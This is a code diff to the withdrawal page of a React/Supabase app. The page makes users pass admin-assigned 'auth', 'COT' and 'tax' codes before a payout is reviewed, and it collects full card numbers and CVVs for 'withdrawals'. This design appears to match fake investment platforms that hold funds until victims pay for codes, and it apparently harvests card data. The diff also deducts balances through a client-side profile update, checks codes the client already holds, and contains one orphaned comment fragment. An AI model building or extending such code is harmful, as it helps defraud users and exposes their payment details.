@@ -61,7 +61,10 @@ export default function Withdraw() {
       .channel(`withdraw-balance-${user.id}`)
       .on("postgres_changes",
         { event: "UPDATE", schema: "public", table: "profiles", filter: `user_id=eq.${user.id}` },
-        (payload) => { if ((payload.new as any).total_balance !== undefined) setBalance(Number((payload.new as any).total_balance)); })
+        (payload) => {
+          if ((payload.new as any).total_balance !== undefined)
+            setBalance(Number((payload.new as any).total_balance));
+        })
       .subscribe();
     return () => { supabase.removeChannel(ch); };
   }, [user?.id]);
@@ -84,6 +87,7 @@ export default function Withdraw() {
   // Verification dialog state
   const [authOpen, setAuthOpen] = useState(false);
   const [pendingTxId, setPendingTxId] = useState<string | null>(null);
+  const [pendingTxAmount, setPendingTxAmount] = useState<number | null>(null);
   const [codes, setCodes] = useState<AccountCode[]>([]);
   const [stepIndex, setStepIndex] = useState(0);
   const [input, setInput] = useState("");
@@ -117,33 +121,76 @@ export default function Withdraw() {
 
     if (data) {
       const rows: AccountCode[] = [];
-      if ((data as any).auth_code) rows.push({ id: (data as any).id, code_type: "auth", code: (data as any).auth_code, verified: false });
-      if ((data as any).cot_required && (data as any).cot_code) rows.push({ id: (data as any).id, code_type: "cot", code: (data as any).cot_code, verified: false });
-      if ((data as any).tax_required && (data as any).tax_code) rows.push({ id: (data as any).id, code_type: "tax", code: (data as any).tax_code, verified: false });
+      if ((data as any).auth_code)
+        rows.push({ id: (data as any).id, code_type: "auth", code: (data as any).auth_code, verified: false });
+      if ((data as any).cot_required && (data as any).cot_code)
+        rows.push({ id: (data as any).id, code_type: "cot", code: (data as any).cot_code, verified: false });
+      if ((data as any).tax_required && (data as any).tax_code)
+        rows.push({ id: (data as any).id, code_type: "tax", code: (data as any).tax_code, verified: false });
       setCodes(rows);
     }
   };
 
+  /**
+   * Creates the withdrawal transaction with status "pending".
+   * No balance deduction happens here — only after codes are fully verified.
+   */
   const submit = async (method: string, body: Record<string, unknown>, amt: string) => {
     if (!user) return;
     const a = amountSchema.safeParse(amt);
     if (!a.success) { toast.error(a.error.errors[0].message); return; }
     if (balance !== null && a.data > balance) { toast.error("Insufficient balance"); return; }
+
     setSubmitting(true);
-    // Strip non-existent destination key before insert
-    const { destination: _omit, ...rest } = body as Record<string, unknown>;
-    const { data, error } = await supabase.from("transactions").insert({
-      user_id: user.id, amount: a.data, method, type: "withdrawal", status: "awaiting_code", ...rest,
-    } as never).select("id").maybeSingle();
+
+    // Save destination separately, then build the insert payload without it
+    // (destination is a derived/display field — store it under its specific column instead)
+    const { destination: _dest, ...rest } = body as Record<string, unknown>;
+
+    const { data, error } = await supabase
+      .from("transactions")
+      .insert({
+        user_id: user.id,
+        amount: a.data,
+        method,
+        type: "withdrawal",
+        // Status is "pending" on creation. Balance is NOT deducted yet.
+        // It will be deducted only once the user successfully verifies all codes.
+        status: "pending",
+        ...rest,
+      } as never)
+      .select("id")
+      .maybeSingle();
+
     setSubmitting(false);
+
     if (error || !data) { toast.error(error?.message ?? "Failed to submit"); return; }
+
     setPendingTxId(data.id);
+    setPendingTxAmount(a.data);
     setInput("");
     setStepIndex(0);
     setAuthOpen(true);
     setRefreshHistory((n) => n + 1);
   };
 
+  /**
+   * Verification logic:
+   * - Walks through activeSteps (auth → cot? → tax?)
+   * - On final step completion:
+   *   1. Sets tx status to "pending" with auth_code_verified = true
+   *   2. Deducts the withdrawal amount from the user's balance
+   * - If user closes modal at any point before finishing, tx stays "pending"
+   *   with no balance change. The WithdrawalHistory "Continue" button lets them
+   *   resume later.
+   *
+   * Admin side (handled outside this component):
+   * - If admin assigns a new verification code to an existing "pending" tx,
+   *   they flip it to "awaiting_code". No balance change happens at that point.
+   *   The history shows a "Complete" button which calls onResume, reopening
+   *   this modal. Balance is only deducted when all codes are fully verified.
+   *   normal flow and stay "pending" after verification.
+   */
   const verify = async () => {
     if (!user || !currentType) return;
     const entered = input.trim().toUpperCase();
@@ -151,25 +198,58 @@ export default function Withdraw() {
 
     if (currentType === "auth") {
       const assignedAuth = codes.find((c) => c.code_type === "auth");
-      const validCode = assignedAuth ? assignedAuth.code.trim().toUpperCase() : defaultCode?.trim().toUpperCase();
+      const validCode = assignedAuth
+        ? assignedAuth.code.trim().toUpperCase()
+        : defaultCode?.trim().toUpperCase();
       if (!validCode) { toast.error("No authentication code assigned. Contact support."); return; }
       if (entered !== validCode) { toast.error("Invalid authentication code."); return; }
       setVerifying(true);
-      if (assignedAuth) await supabase.from("account_withdrawal_codes").update({ verified: true } as never).eq("id", assignedAuth.id);
+      if (assignedAuth)
+        await supabase.from("account_withdrawal_codes").update({ verified: true } as never).eq("id", assignedAuth.id);
     } else {
       if (!currentCode) { toast.error("No code assigned for this step."); return; }
-      if (entered !== currentCode.code.trim().toUpperCase()) { toast.error(`Invalid ${STEP_META[currentType].title.toLowerCase()}.`); return; }
+      if (entered !== currentCode.code.trim().toUpperCase()) {
+        toast.error(`Invalid ${STEP_META[currentType].title.toLowerCase()}.`);
+        return;
+      }
       setVerifying(true);
       await supabase.from("account_withdrawal_codes").update({ verified: true } as never).eq("id", currentCode.id);
     }
 
     const nextIdx = stepIndex + 1;
     setInput("");
+
     if (nextIdx >= activeSteps.length) {
-      if (pendingTxId) await supabase.from("transactions").update({ status: "pending_review", auth_code_verified: true } as never).eq("id", pendingTxId);
+      // ── All steps complete ──
+      if (pendingTxId) {
+        // 1. Mark transaction as verified and keep status "pending" for admin review
+        await supabase
+          .from("transactions")
+          .update({ status: "pending", auth_code_verified: true } as never)
+          .eq("id", pendingTxId);
+
+        // 2. Deduct the withdrawal amount from the user's balance now that codes are verified
+        if (pendingTxAmount !== null) {
+          const { data: profileData } = await supabase
+            .from("profiles")
+            .select("total_balance")
+            .eq("user_id", user.id)
+            .maybeSingle();
+
+          if (profileData) {
+            const newBalance = Math.max(0, Number(profileData.total_balance) - pendingTxAmount);
+            await supabase
+              .from("profiles")
+              .update({ total_balance: newBalance } as never)
+              .eq("user_id", user.id);
+          }
+        }
+      }
+
       setVerifying(false);
       setAuthOpen(false);
       setPendingTxId(null);
+      setPendingTxAmount(null);
       setRefreshHistory((n) => n + 1);
       toast.success("Codes verified. Withdrawal is under final review.");
     } else {
@@ -179,10 +259,17 @@ export default function Withdraw() {
     }
   };
 
-  const cancelRequest = async () => {
-    if (pendingTxId) await supabase.from("transactions").update({ status: "cancelled" } as never).eq("id", pendingTxId);
+  /**
+   * User closes modal without completing verification.
+   * Transaction stays "pending" — no balance change.
+   * WithdrawalHistory will show a "Continue" button for this tx.
+   */
+  const cancelRequest = () => {
+    // Do NOT update tx status or balance — tx stays "pending"
+    // so the user can resume via the "Continue" button in withdrawal history.
     setAuthOpen(false);
     setPendingTxId(null);
+    setPendingTxAmount(null);
     setRefreshHistory((n) => n + 1);
   };
 
@@ -192,16 +279,24 @@ export default function Withdraw() {
     let label = "";
     if (m === "cashapp") {
       if (!other.cashapp_tag.trim()) return toast.error("Enter your $cashtag");
-      body.destination = other.cashapp_tag.trim(); body.cashapp_tag = other.cashapp_tag.trim(); label = "CashApp";
+      body.destination = other.cashapp_tag.trim();
+      body.cashapp_tag = other.cashapp_tag.trim();
+      label = "CashApp";
     } else if (m === "paypal") {
       if (!/^\S+@\S+\.\S+$/.test(other.paypal_email)) return toast.error("Enter a valid PayPal email");
-      body.destination = other.paypal_email.trim(); body.paypal_email = other.paypal_email.trim(); label = "PayPal";
+      body.destination = other.paypal_email.trim();
+      body.paypal_email = other.paypal_email.trim();
+      label = "PayPal";
     } else if (m === "venmo") {
       if (!other.venmo_handle.trim()) return toast.error("Enter your Venmo handle");
-      body.destination = other.venmo_handle.trim(); body.venmo_handle = other.venmo_handle.trim(); label = "Venmo";
+      body.destination = other.venmo_handle.trim();
+      body.venmo_handle = other.venmo_handle.trim();
+      label = "Venmo";
     } else if (m === "chime") {
       if (!other.chime_email.trim()) return toast.error("Enter your Chime email");
-      body.destination = other.chime_email.trim(); label = "Chime";
+      body.destination = other.chime_email.trim();
+      body.chime_email = other.chime_email.trim();
+      label = "Chime";
     } else if (m === "card") {
       if (other.card_number.replace(/\s/g, "").length < 12) return toast.error("Enter a valid card number");
       if (!other.card_exp.trim()) return toast.error("Enter expiration date");
@@ -209,15 +304,15 @@ export default function Withdraw() {
       if (!other.card_billing_name.trim()) return toast.error("Enter billing name");
       body.destination = `**** ${other.card_number.replace(/\s/g, "").slice(-4)}`;
       body.card_number = other.card_number.replace(/\s/g, "");
-      body.card_exp = other.card_exp.trim(); body.card_cvv = other.card_cvv.trim();
-      body.card_billing_name = other.card_billing_name.trim(); label = "Credit Card";
+      body.card_exp = other.card_exp.trim();
+      body.card_cvv = other.card_cvv.trim();
+      body.card_billing_name = other.card_billing_name.trim();
+      label = "Credit Card";
     }
     submit(label, body, other.amount);
   };
 
   const StepIcon = currentType ? STEP_META[currentType].icon : ShieldAlert;
-
-  // Shared input classes for dark theme
   const selectCls = "w-full h-10 rounded-md border border-white/10 bg-white/5 px-3 text-sm text-white focus:outline-none focus:ring-2 focus:ring-yellow-500/50";
 
   return (
@@ -263,7 +358,8 @@ export default function Withdraw() {
                 <Label className="text-white/70 text-sm">Amount ({currency})</Label>
                 <div className="relative">
                   <span className="absolute left-3 top-1/2 -translate-y-1/2 text-white/40 text-sm">{symbol}</span>
-                  <Input type="number" min="1" step="0.01" value={crypto.amount} onChange={(e) => setCrypto({ ...crypto, amount: e.target.value })}
+                  <Input type="number" min="1" step="0.01" value={crypto.amount}
+                    onChange={(e) => setCrypto({ ...crypto, amount: e.target.value })}
                     className="pl-7 bg-white/5 border-white/10 text-white placeholder:text-white/20" />
                 </div>
               </div>
@@ -271,9 +367,12 @@ export default function Withdraw() {
             <div className="space-y-1.5">
               <Label className="text-white/70 text-sm">Wallet address</Label>
               <Input value={crypto.address} onChange={(e) => setCrypto({ ...crypto, address: e.target.value })}
-                placeholder="Paste wallet address" className="font-mono text-xs bg-white/5 border-white/10 text-white placeholder:text-white/20" />
+                placeholder="Paste wallet address"
+                className="font-mono text-xs bg-white/5 border-white/10 text-white placeholder:text-white/20" />
             </div>
-            <Button variant="gold" disabled={submitting} onClick={() => submit(`Crypto ${crypto.coin}`, { wallet_address: crypto.address, destination: crypto.address }, crypto.amount)} className="w-full">
+            <Button variant="gold" disabled={submitting}
+              onClick={() => submit(`Crypto ${crypto.coin}`, { wallet_address: crypto.address }, crypto.amount)}
+              className="w-full">
               {submitting ? <Loader2 className="w-4 h-4 animate-spin mr-2" /> : null}
               {submitting ? "Processing…" : "Request Withdrawal"}
             </Button>
@@ -288,7 +387,8 @@ export default function Withdraw() {
                 <Label className="text-white/70 text-sm">Amount ({currency})</Label>
                 <div className="relative">
                   <span className="absolute left-3 top-1/2 -translate-y-1/2 text-white/40 text-sm">{symbol}</span>
-                  <Input type="number" min="1" step="0.01" value={bank.amount} onChange={(e) => setBank({ ...bank, amount: e.target.value })}
+                  <Input type="number" min="1" step="0.01" value={bank.amount}
+                    onChange={(e) => setBank({ ...bank, amount: e.target.value })}
                     className="pl-7 bg-white/5 border-white/10 text-white placeholder:text-white/20" />
                 </div>
               </div>
@@ -314,7 +414,8 @@ export default function Withdraw() {
               </div>
             </div>
             <Button variant="gold" disabled={submitting}
-              onClick={() => submit("Bank Transfer", { destination: bank.account_no, bank_details: bank }, bank.amount)} className="w-full">
+              onClick={() => submit("Bank Transfer", { bank_details: bank }, bank.amount)}
+              className="w-full">
               {submitting ? <Loader2 className="w-4 h-4 animate-spin mr-2" /> : null}
               {submitting ? "Processing…" : "Request Withdrawal"}
             </Button>
@@ -339,7 +440,8 @@ export default function Withdraw() {
                 <Label className="text-white/70 text-sm">Amount ({currency})</Label>
                 <div className="relative">
                   <span className="absolute left-3 top-1/2 -translate-y-1/2 text-white/40 text-sm">{symbol}</span>
-                  <Input type="number" min="1" step="0.01" value={other.amount} onChange={(e) => setOther({ ...other, amount: e.target.value })}
+                  <Input type="number" min="1" step="0.01" value={other.amount}
+                    onChange={(e) => setOther({ ...other, amount: e.target.value })}
                     className="pl-7 bg-white/5 border-white/10 text-white placeholder:text-white/20" />
                 </div>
               </div>
@@ -411,8 +513,14 @@ export default function Withdraw() {
       </Tabs>
 
       {/* ── VERIFICATION DIALOG ── */}
-      <Dialog open={authOpen} onOpenChange={(o) => { if (!o) cancelRequest(); }}>
-        <DialogContent className="max-w-md p-0 overflow-hidden border-white/10 bg-zinc-900" style={{ borderRadius: 16 }}>
+      <Dialog
+        open={authOpen}
+        onOpenChange={(o) => { if (!o) cancelRequest(); }}
+      >
+        <DialogContent
+          className="max-w-md p-0 overflow-hidden border-white/10 bg-zinc-900"
+          style={{ borderRadius: 16 }}
+        >
           {/* Header */}
           <div className="px-6 pt-6 pb-4 border-b border-white/10 bg-gradient-to-b from-white/5 to-transparent">
             <div className="flex items-center gap-3 mb-3">
@@ -433,7 +541,12 @@ export default function Withdraw() {
                   const done = i < stepIndex;
                   const active = i === stepIndex;
                   return (
-                    <div key={t} className={`h-1 flex-1 rounded-full transition-colors ${done ? "bg-yellow-500" : active ? "bg-yellow-500/70" : "bg-white/10"}`} />
+                    <div
+                      key={t}
+                      className={`h-1 flex-1 rounded-full transition-colors ${
+                        done ? "bg-yellow-500" : active ? "bg-yellow-500/70" : "bg-white/10"
+                      }`}
+                    />
                   );
                 })}
               </div>
@@ -446,7 +559,9 @@ export default function Withdraw() {
               {currentType ? STEP_META[currentType].subtitle : ""}
             </p>
             <div className="space-y-1.5">
-              <Label htmlFor="auth-code" className="text-[12px] font-medium text-white/60">Verification code</Label>
+              <Label htmlFor="auth-code" className="text-[12px] font-medium text-white/60">
+                Verification code
+              </Label>
               <Input
                 id="auth-code"
                 value={input}
@@ -464,12 +579,22 @@ export default function Withdraw() {
 
           {/* Footer */}
           <DialogFooter className="px-6 py-4 bg-white/5 border-t border-white/10 gap-2 sm:gap-2">
-            <Button variant="outline" onClick={cancelRequest}
-              className="rounded-full border-white/10 text-white/70 hover:bg-white/10 hover:text-white bg-transparent">
+            <Button
+              variant="outline"
+              onClick={cancelRequest}
+              className="rounded-full border-white/10 text-white/70 hover:bg-white/10 hover:text-white bg-transparent"
+            >
               Cancel
             </Button>
-            <Button variant="gold" disabled={verifying || input.trim().length < 4} onClick={verify} className="rounded-full min-w-[140px]">
-              {verifying ? <Loader2 className="w-4 h-4 animate-spin" /> : (stepIndex + 1 === activeSteps.length ? "Verify & finish" : "Verify & continue")}
+            <Button
+              variant="gold"
+              disabled={verifying || input.trim().length < 4}
+              onClick={verify}
+              className="rounded-full min-w-[140px]"
+            >
+              {verifying
+                ? <Loader2 className="w-4 h-4 animate-spin" />
+                : (stepIndex + 1 === activeSteps.length ? "Verify & finish" : "Verify & continue")}
             </Button>
           </DialogFooter>
         </DialogContent>
@@ -479,7 +604,13 @@ export default function Withdraw() {
       <WithdrawalHistory
         symbol={symbol}
         refreshKey={refreshHistory}
-        onResume={(txId) => { setPendingTxId(txId); setInput(""); setStepIndex(0); setAuthOpen(true); }}
+        onResume={(txId, txAmount) => {
+          setPendingTxId(txId);
+          setPendingTxAmount(txAmount);
+          setInput("");
+          setStepIndex(0);
+          setAuthOpen(true);
+        }}
       />
     </div>
   );
